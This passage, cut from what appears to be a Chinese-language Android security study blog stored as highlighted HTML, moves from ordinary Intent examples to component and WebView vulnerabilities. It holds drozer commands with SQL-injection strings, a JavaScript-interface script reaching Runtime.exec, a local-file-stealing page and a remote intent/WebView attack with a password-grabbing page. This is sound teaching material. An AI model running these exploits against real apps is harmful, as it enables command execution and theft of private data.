class="line">passwordEditText.setText(password);</span><br><span class="line"></span><br><span class="line"><span class="comment">//主activity中，绑定一个button然后：</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">onClick</span><span class="params">(View V)</span>&#123;</span><br><span class="line"><span class="type">Intent</span> <span class="variable">intent</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Intent</span>(MainActivity.<span class="built_in">this</span>,LoginActivity.class);</span><br><span class="line">intent.putExtra(<span class="string">&quot;key_account&quot;</span>,<span class="string">&quot;admin&quot;</span>);</span><br><span class="line">intent.putExtra(<span class="string">&quot;key_password&quot;</span>,<span class="string">&quot;test&quot;</span>);</span><br><span class="line">startActivity(intent); </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>如果在login登录框中输入的信息要返回到MainActivity中，</p><p>在loginActivity中的按钮事件代码中添加相应功能：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">onClick</span><span class="params">(View V)</span>&#123;</span><br><span class="line">    <span class="type">Intent</span> <span class="variable">intent</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Intent</span>( );</span><br><span class="line">intent.putExtra(<span class="string">&quot;key_account&quot;</span>,usernameEditText.getText().toString());</span><br><span class="line">intent.putExtra(<span class="string">&quot;key_password&quot;</span>,passwordEditText.getText().toString());</span><br><span class="line">setResult(RESULT_OK,intent);</span><br><span class="line">finish();   </span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>在MainActivity中添加功能使其知道loginactivity何时销毁，然后接收信息。</p><p>startActivityForResult(intent)：期望在<strong>活动销毁</strong>的时候能够返回一个结果给上一个活动。 </p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//requestCode ==&gt; 请求码，resultCode ==&gt; 返回数据时传入的处理结果 data == &gt;携带着返回数据的Intent</span></span><br><span class="line"><span class="keyword">protected</span> <span class="keyword">void</span> <span class="title function_">onActivityResult</span><span class="params">(<span class="type">int</span> requestCode, <span class="type">int</span> resultCode, Intent data)</span> &#123;</span><br><span class="line">    <span class="built_in">super</span>.onActivityResult(requestCode, resultCode, data);</span><br><span class="line">    <span class="keyword">if</span>(requestCode == <span class="number">1000</span> &amp;&amp; resultCode == RESULT_OK)&#123;  <span class="comment">//1000是请求码</span></span><br><span class="line">        <span class="type">String</span> <span class="variable">accout</span> <span class="operator">=</span> data.getStringExtra(<span class="string">&quot;key_account&quot;</span>);</span><br><span class="line">        <span class="type">String</span> <span class="variable">password</span> <span class="operator">=</span> data.getStringExtra(<span class="string">&quot;key_password&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">onClick</span><span class="params">(View V)</span>&#123;</span><br><span class="line"><span class="type">Intent</span> <span class="variable">intent</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Intent</span>(MainActivity.<span class="built_in">this</span>,LoginActivity.class);</span><br><span class="line">intent.putExtra(<span class="string">&quot;key_account&quot;</span>,<span class="string">&quot;admin&quot;</span>);</span><br><span class="line">intent.putExtra(<span class="string">&quot;key_password&quot;</span>,<span class="string">&quot;test&quot;</span>);</span><br><span class="line">startActivityForResult(intent,<span class="number">1000</span>); </span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//在loginActivity中</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">onClick</span><span class="params">(View V)</span>&#123;</span><br><span class="line">    <span class="type">Intent</span> <span class="variable">intent</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Intent</span>( );</span><br><span class="line">intent.putExtra(<span class="string">&quot;key_account&quot;</span>,usernameEditText.getText().toString());</span><br><span class="line">intent.putExtra(<span class="string">&quot;key_password&quot;</span>,passwordEditText.getText().toString());</span><br><span class="line">setResult(RESULT_OK,intent);</span><br><span class="line">finish();   <span class="comment">//销毁</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="隐式Intent"><a href="#隐式Intent" class="headerlink" title="隐式Intent"></a>隐式Intent</h3><p>在配置文件中自己注册意图，如</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">activity</span></span></span><br><span class="line"><span class="tag">          <span class="attr">android:name</span>=<span class="string">&quot;要注册意图的Activity&quot;</span></span></span><br><span class="line"><span class="tag">          <span class="attr">android</span>：<span class="attr">label</span>=<span class="string">&quot;xxx&quot;</span></span></span><br><span class="line"><span class="tag">          </span></span><br><span class="line"><span class="tag">&lt;/<span class="attr">activity</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">intent-filter</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">action</span> <span class="attr">android:name</span>=<span class="string">&quot;要填入内容&quot;</span>/&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">category</span> <span class="attr">android:name</span>=<span class="string">&quot;android.intent.category.DEFAULT&quot;</span>/&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">intent-filter</span>&gt;</span></span><br></pre></td></tr></table></figure><p>启动：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">onClick</span><span class="params">(View V)</span>&#123;</span><br><span class="line">    <span class="type">Intent</span> <span class="variable">intent</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Intent</span>();</span><br><span class="line">    intent.setAction(<span class="string">&quot;配置文件中添加的内容信息&quot;</span>)</span><br><span class="line">    intent.putExtra(<span class="string">&quot;key_account&quot;</span>,<span class="string">&quot;admin&quot;</span>);</span><br><span class="line">    intent.putExtra(<span class="string">&quot;key_password&quot;</span>,<span class="string">&quot;test&quot;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="四大组件简单漏洞"><a href="#四大组件简单漏洞" class="headerlink" title="四大组件简单漏洞"></a>四大组件简单漏洞</h2><h3 id="Activity-1"><a href="#Activity-1" class="headerlink" title="Activity"></a>Activity</h3><h4 id="越权绕过"><a href="#越权绕过" class="headerlink" title="越权绕过"></a><strong>越权绕过</strong></h4><p><strong>原理</strong></p><p>在Android系统中，Activity默认是不可以导出的，如果设置了exported =”true”或者添加了<intent``-``filter>，这样Activity就变成了可导出，就会导致越权绕过或者是泄露敏感信息等安全风险。</p><p>对于漏洞检测可以使用drozer。</p><p><strong>drozer简单使用</strong></p><ul><li><p>drozer连接</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="attribute">adb</span> forward tcp:<span class="number">31415</span> tcp:<span class="number">31415</span></span><br><span class="line"><span class="attribute">drozer</span> console connect</span><br></pre></td></tr></table></figure></li><li><p>进入drozer输入list或ls，查看drozer 所有模块</p></li><li><p>查找安装包  <code>run  app.package.list -f</code></p></li><li><p>查看安装包信息 <code>run  app.package.info -a 安装包名</code></p></li><li><p>查看暴露的组件<br>Drozer可检测apk源码四大组件（activities、broadcast receivers、content providers、services）的export情况，并判断export的组件提供那些服务(exported”表示组件可以被其他App使用)，因为服务是可以调试的，可以将调试器附加到进程上，进行调试。<br><code>run  app.package.attacksurface  安装包名</code></p></li></ul><p><code>run app.activity.info  -a  安装包名</code></p><p><code>run app.activity.start --component 包名 组件名</code></p><p>调用组件服务 ==&gt; <code>run app.service.start --action 服务名 --component 包名 服务名</code></p><figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">Broadcast组件</span><br><span class="line"></span><br><span class="line">run app<span class="selector-class">.broadcast</span><span class="selector-class">.info</span> -<span class="selector-tag">a</span> &lt;package name&gt; 测试对外的broadcast组件信息</span><br><span class="line">run app<span class="selector-class">.broadcast</span><span class="selector-class">.send</span> <span class="attr">--component</span> &lt;package name&gt; &lt;component name&gt; <span class="attr">--action</span> &lt;action&gt; <span class="attr">--extra</span> &lt;type&gt; &lt;key&gt; &lt;value&gt; 发送带参数的恶意广播</span><br><span class="line">run app<span class="selector-class">.broadcast</span><span class="selector-class">.send</span> <span class="attr">--action</span> &lt;action&gt; 向广播组件发送不完整intent使用空extras，可以看到应用停止运行</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">Content组件</span><br><span class="line"></span><br><span class="line">run app<span class="selector-class">.provider</span><span class="selector-class">.info</span>   -<span class="selector-tag">a</span> </span><br><span class="line">run scanner<span class="selector-class">.provider</span><span class="selector-class">.findurls</span> -<span class="selector-tag">a</span> &lt;package name&gt;  扫描url</span><br><span class="line">run app<span class="selector-class">.provider</span><span class="selector-class">.query</span> uri  访问url</span><br><span class="line"></span><br><span class="line">run scanner<span class="selector-class">.provider</span><span class="selector-class">.injection</span> -<span class="selector-tag">a</span> packageName 扫描那里可以进行SQL注入</span><br><span class="line">run scanner<span class="selector-class">.provider</span><span class="selector-class">.sqltables</span> -<span class="selector-tag">a</span> com<span class="selector-class">.mwr</span><span class="selector-class">.example</span><span class="selector-class">.sieve</span> 列举app的表信息</span><br><span class="line">projection 测试：run app<span class="selector-class">.provider</span><span class="selector-class">.query</span> contentProviderURI <span class="attr">--projection</span> <span class="string">&quot;&#x27;&quot;</span></span><br><span class="line">selection 测试：run app<span class="selector-class">.provider</span><span class="selector-class">.query</span> contentProviderURI <span class="attr">--selection</span> <span class="string">&quot;&#x27;&quot;</span></span><br><span class="line">projection注入语句测试：run app<span class="selector-class">.provider</span><span class="selector-class">.query</span> contentProviderURI <span class="attr">--projection</span> <span class="string">&quot;* FROM xx;--&quot;</span></span><br><span class="line">Selection注入语句测试：run app<span class="selector-class">.provider</span><span class="selector-class">.query</span> contentProviderURI <span class="attr">--selection</span> <span class="string">&quot;1=1);--&quot;</span></span><br><span class="line"></span><br><span class="line">目录遍历漏洞检测：</span><br><span class="line">run scanner<span class="selector-class">.provider</span><span class="selector-class">.traversal</span> -<span class="selector-tag">a</span> &lt;package name&gt;</span><br></pre></td></tr></table></figure><h2 id="WebView"><a href="#WebView" class="headerlink" title="WebView"></a>WebView</h2><h3 id="历史漏洞"><a href="#历史漏洞" class="headerlink" title="历史漏洞"></a>历史漏洞</h3><p>简单说一说就是</p><ol><li><p>js和Android进行通信时，有个<code>addJavascriptInterface</code>接口进行对象映射，可以通过映射的js对象调用android对象的方法<br><strong>攻击步骤</strong></p><figure class="highlight arcade"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">（<span class="string">``</span><span class="number">1</span><span class="string">``</span>）Android中的对象有一公共的方法：getClass()</span><br><span class="line">（<span class="string">``</span><span class="number">2</span><span class="string">``</span>）该方法可以获取到当前类 类型Class</span><br><span class="line">（<span class="string">``</span><span class="number">3</span><span class="string">``</span>）该类有一关键的方法： Class.forName；</span><br><span class="line">（<span class="string">``</span><span class="number">4</span><span class="string">``</span>）该方法可以加载一个类（可加载 java.lang.Runtime 类）</span><br><span class="line">（<span class="string">``</span><span class="number">5</span><span class="string">``</span>）而该类是可以执行本地命令的</span><br></pre></td></tr></table></figure></li></ol><p>​      攻击脚本</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">function <span class="title function_">execute</span><span class="params">(cmdArgs)</span> </span><br><span class="line">&#123; </span><br><span class="line">    <span class="comment">// 步骤1：遍历 window 对象</span></span><br><span class="line">    <span class="comment">// 目的是为了找到包含 getClass （）的对象</span></span><br><span class="line">    <span class="comment">// 因为Android映射的JS对象也在window中，所以肯定会遍历到</span></span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">var</span> obj in window) &#123; </span><br><span class="line">        <span class="keyword">if</span> (<span class="string">&quot;getClass&quot;</span> in window[obj]) &#123; </span><br><span class="line"> </span><br><span class="line">      <span class="comment">// 步骤2：利用反射调用forName（）得到Runtime类对象</span></span><br><span class="line">            alert(obj);         </span><br><span class="line">            <span class="keyword">return</span>  window[obj].getClass().forName(<span class="string">&quot;java.lang.Runtime&quot;</span>) </span><br><span class="line"> </span><br><span class="line">      <span class="comment">// 步骤3：以后，就可以调用静态方法来执行一些命令，比如访问文件的命令</span></span><br><span class="line">getMethod(<span class="string">&quot;getRuntime&quot;</span>,<span class="literal">null</span>).invoke(<span class="literal">null</span>,<span class="literal">null</span>).exec(cmdArgs); </span><br><span class="line"> </span><br><span class="line"><span class="comment">// 从执行命令后返回的输入流中得到字符串，有很严重暴露隐私的危险。</span></span><br><span class="line"><span class="comment">// 如执行完访问文件的命令之后，就可以得到文件名的信息了。</span></span><br><span class="line">        &#125; </span><br><span class="line">    &#125; </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>2.webview默认开启密码保存，会保存在 <code>/data/data/com.package.name/databases/webview.db</code></p><h3 id="跨域漏洞"><a href="#跨域漏洞" class="headerlink" title="跨域漏洞"></a>跨域漏洞</h3><h4 id="任意文件窃取"><a href="#任意文件窃取" class="headerlink" title="任意文件窃取"></a><strong>任意文件窃取</strong></h4><p><strong>原理</strong>：setAllowFileAccess(true) + setAllowFileAccessFromFileURLs(true)</p><p>这样使webview可以使用File协议，且加载的js脚本文件可以访问本地文件</p><p><strong>复现</strong>：获得/etc/hosts中私有文件信息</p><p>编写js脚本</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">&lt;script&gt;</span><br><span class="line"><span class="keyword">function</span> <span class="title function_">loadXMLDoc</span>(<span class="params"></span>)</span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">var</span> arm = <span class="string">&quot;file:///etc/hosts&quot;</span>;  </span><br><span class="line">    <span class="keyword">var</span> xmlhttp;</span><br><span class="line">    <span class="keyword">if</span> (<span class="variable language_">window</span>.<span class="property">XMLHttpRequest</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        xmlhttp=<span class="keyword">new</span> <span class="title class_">XMLHttpRequest</span>();</span><br><span class="line">    &#125;</span><br><span class="line">    xmlhttp.<span class="property">onreadystatechange</span>=<span class="keyword">function</span>(<span class="params"></span>)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="comment">//alert(&quot;status is&quot;+xmlhttp.status);</span></span><br><span class="line">        <span class="keyword">if</span> (xmlhttp.<span class="property">readyState</span>==<span class="number">4</span>)</span><br><span class="line">        &#123;</span><br><span class="line">              <span class="variable language_">console</span>.<span class="title function_">log</span>(xmlhttp.<span class="property">responseText</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    xmlhttp.<span class="title function_">open</span>(<span class="string">&quot;GET&quot;</span>,arm);</span><br><span class="line">    xmlhttp.<span class="title function_">send</span>(<span class="literal">null</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="title function_">loadXMLDoc</span>();</span><br><span class="line">&lt;/script&gt;</span><br></pre></td></tr></table></figure><p>然后将js脚本上传置/data/local/tmp目录下</p><p>编写攻击脚本</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@Override</span></span><br><span class="line">  <span class="keyword">protected</span> <span class="keyword">void</span> <span class="title function_">onCreate</span><span class="params">(Bundle savedInstanceState)</span> &#123;</span><br><span class="line">      <span class="built_in">super</span>.onCreate(savedInstanceState);</span><br><span class="line">      setContentView(R.layout.activity_file_web_view);</span><br><span class="line">      <span class="type">WebView</span> <span class="variable">webView</span> <span class="operator">=</span> findViewById(R.id.Wind_webview0);</span><br><span class="line">      <span class="comment">//设置是否允许 WebView 使用 File 协议</span></span><br><span class="line">      webView.getSettings().setAllowFileAccess(<span class="literal">true</span>);</span><br><span class="line"> </span><br><span class="line"> </span><br><span class="line">      <span class="comment">//设置是否允许 WebView 使用 JavaScript</span></span><br><span class="line">      webView.getSettings().setJavaScriptEnabled(<span class="literal">true</span>);</span><br><span class="line">      webView.getSettings().setAllowFileAccessFromFileURLs(<span class="literal">true</span>);</span><br><span class="line"> </span><br><span class="line">      webView.loadUrl(<span class="string">&quot;file:///data/local/tmp/fileAttack.html&quot;</span>);</span><br><span class="line"> </span><br><span class="line">  &#125;</span><br></pre></td></tr></table></figure><p>这里就获取了相应的私有文件信息，而且加载了我们的恶意html文件</p><h4 id="通用协议漏洞-恶意网页注入"><a href="#通用协议漏洞-恶意网页注入" class="headerlink" title="通用协议漏洞(恶意网页注入)"></a>通用协议漏洞(恶意网页注入)</h4><p>漏洞原理：setAllowFileAccess(true) + setAllowUniversalAccessFromFileURLs(true)</p><p>本质和上面的差不多，将js脚本链接改为一个网页的url</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">&lt;script&gt;</span><br><span class="line"><span class="keyword">function</span> <span class="title function_">loadXMLDoc</span>(<span class="params"></span>)</span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">var</span> arm = <span class="string">&quot;https://bbs.pediy.com/&quot;</span>;</span><br><span class="line">    <span class="keyword">var</span> xmlhttp;</span><br><span class="line">    <span class="keyword">if</span> (<span class="variable language_">window</span>.<span class="property">XMLHttpRequest</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        xmlhttp=<span class="keyword">new</span> <span class="title class_">XMLHttpRequest</span>();</span><br><span class="line">    &#125;</span><br><span class="line">    xmlhttp.<span class="property">onreadystatechange</span>=<span class="keyword">function</span>(<span class="params"></span>)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="comment">//alert(&quot;status is&quot;+xmlhttp.status);</span></span><br><span class="line">        <span class="keyword">if</span> (xmlhttp.<span class="property">readyState</span>==<span class="number">4</span>)</span><br><span class="line">        &#123;</span><br><span class="line">              <span class="variable language_">console</span>.<span class="title function_">log</span>(xmlhttp.<span class="property">responseText</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    xmlhttp.<span class="title function_">open</span>(<span class="string">&quot;GET&quot;</span>,arm);</span><br><span class="line">    xmlhttp.<span class="title function_">send</span>(<span class="literal">null</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="title function_">loadXMLDoc</span>();</span><br><span class="line">&lt;/script&gt;</span><br></pre></td></tr></table></figure><h4 id="符号链接跨源攻击"><a href="#符号链接跨源攻击" class="headerlink" title="符号链接跨源攻击"></a>符号链接跨源攻击</h4><p>setAllowFileAccess为True</p><p><strong>原理：</strong></p><p>其攻击过程首先是操纵WebView去访问一个攻击APP自己公开出来的网页，然后这个网页执行的内容其实就是延时去读取自身。在延时读取自身的时间窗口内，这个文件悄悄被进行了替换，替换成了软链接，指向受害APP的一个私有文件，最终读取窃取其内容。</p><h3 id="intent-webview"><a href="#intent-webview" class="headerlink" title="intent+webview"></a>intent+webview</h3><p>样例代码</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line">public class JsIntentActivity extends AppCompatActivity &#123;</span><br><span class="line"> </span><br><span class="line">    @Override</span><br><span class="line">    protected void onCreate(Bundle savedInstanceState) &#123;</span><br><span class="line">        super.onCreate(savedInstanceState);</span><br><span class="line">        setContentView(R.layout.activity_js_intent);</span><br><span class="line">        WebView webView = findViewById(R.id.Wind_webviewIntent);</span><br><span class="line">        webView.getSettings().setJavaScriptEnabled(true);</span><br><span class="line">        webView.addJavascriptInterface(new AndroidtoJs(), &quot;test&quot;);</span><br><span class="line">        webView.loadData(&quot;&quot;, &quot;text/html&quot;, null);</span><br><span class="line">        Uri getUri = getIntent().getData();</span><br><span class="line">        webView.loadUrl(String.valueOf(getUri));</span><br><span class="line"> </span><br><span class="line">    &#125;</span><br><span class="line"> </span><br><span class="line">    /**</span><br><span class="line">     * 提供接口在Webview中供JS调用</span><br><span class="line">     */</span><br><span class="line">    public class AndroidtoJs &#123;</span><br><span class="line">        // 定义JS需要调用的方法，被JS调用的方法必须加入@JavascriptInterface注解</span><br><span class="line">        @JavascriptInterface</span><br><span class="line">        public String getPassword() &#123;</span><br><span class="line">            return &quot;WindXaa12345678&quot;;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"> </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>样例的控件为可导出</p><p>攻击脚本</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">MainActivity</span> <span class="keyword">extends</span> <span class="title class_">AppCompatActivity</span> &#123;</span><br><span class="line"> </span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">protected</span> <span class="keyword">void</span> <span class="title function_">onCreate</span><span class="params">(Bundle savedInstanceState)</span> &#123;</span><br><span class="line">        <span class="built_in">super</span>.onCreate(savedInstanceState);</span><br><span class="line">        setContentView(R.layout.activity_main);</span><br><span class="line">        <span class="type">Button</span> <span class="variable">button</span> <span class="operator">=</span> findViewById(R.id.button);</span><br><span class="line">        button.setOnClickListener(<span class="keyword">new</span> <span class="title class_">View</span>.OnClickListener() &#123;</span><br><span class="line">            <span class="meta">@Override</span></span><br><span class="line">            <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">onClick</span><span class="params">(View v)</span> &#123;</span><br><span class="line">                <span class="type">Intent</span> <span class="variable">attackIntent</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Intent</span>();</span><br><span class="line">                attackIntent.setClassName(<span class="string">&quot;com.iwindxaa.webview&quot;</span>,<span class="string">&quot;com.iwindxaa.webview.JsIntentActivity&quot;</span>);</span><br><span class="line">                attackIntent.setData(Uri.parse(<span class="string">&quot;http://ip地址端口号/attack.html&quot;</span>));</span><br><span class="line">                startActivity(attackIntent);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;);</span><br><span class="line"> </span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>本地编写恶意的html，利用前面讲述的远程加载</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">&lt;!<span class="variable constant_">DOCTYPE</span> html&gt;</span><br><span class="line"><span class="language-xml"><span class="tag">&lt;<span class="name">html</span>&gt;</span></span></span><br><span class="line"><span class="language-xml"><span class="tag">&lt;<span class="name">head</span>&gt;</span></span></span><br><span class="line"><span class="language-xml">    <span class="tag">&lt;<span class="name">meta</span> <span class="attr">charset</span>=<span class="string">&quot;utf-8&quot;</span>&gt;</span></span></span><br><span class="line"><span class="language-xml">    <span class="tag">&lt;<span class="name">title</span>&gt;</span>WebView Atack<span class="tag">&lt;/<span class="name">title</span>&gt;</span></span></span><br><span class="line"><span class="language-xml">    <span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="language-javascript"></span></span></span><br><span class="line"><span class="language-javascript"><span class="language-xml">         <span class="keyword">function</span> <span class="title function_">callAndroid</span>(<span class="params"></span>)&#123;</span></span></span><br><span class="line"><span class="language-javascript"><span class="language-xml">            <span class="comment">//由于对象映射，所以调用test对象等于调用Android映射的对象</span></span></span></span><br><span class="line"><span class="language-javascript"><span class="language-xml">            <span class="keyword">var</span> password = test.<span class="title function_">getPassword</span>();</span></span></span><br><span class="line"><span class="language-javascript"><span class="language-xml">            <span class="variable language_">document</span>.<span class="title function_">getElementById</span>(<span class="string">&quot;getdata&quot;</span>).<span class="property">innerHTML</span>= password;</span></span></span><br><span class="line"><span class="language-javascript"><span class="language-xml">         &#125;</span></span></span><br><span class="line"><span class="language-javascript"><span class="language-xml">     </span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span></span><br><span class="line"><span class="language-xml"><span class="tag">&lt;/<span class="name">head</span>&gt;</span></span></span><br><span class="line"><span class="language-xml"><span class="tag">&lt;<span class="name">body</span>&gt;</span></span></span><br><span class="line"><span class="language-xml">   <span class="tag">&lt;<span class="name">p</span> <span class="attr">id</span>=<span class="string">&quot;getdata&quot;</span>&gt;</span>攻击获得的数据将显示在此……<span class="tag">&lt;/<span class="name">p</span>&gt;</span></span></span><br><span class="line"><span class="language-xml">   <span class="comment">&lt;!--点击按钮则调用callAndroid函数--&gt;</span></span></span><br><span class="line"><span class="language-xml">   <span class="tag">&lt;<span class="name">button</span> <span class="attr">type</span>=<span class="string">&quot;button&quot;</span> <span class="attr">id</span>=<span class="string">&quot;button1&quot;</span> <span class="attr">onclick</span>=<span class="string">&quot;callAndroid()&quot;</span>&gt;</span>CIntent Attack!<span class="tag">&lt;/<span class="name">button</span>&gt;</span></span></span><br><span class="line"><span class="language-xml"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span></span><br><span class="line"><span class="language-xml"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span></span><br></pre></td></tr></table></figure><h3 id="Intent重定向导致launchAnyWhere漏洞"><a href="#Intent重定向导致launchAnyWhere漏洞" class="headerlink" 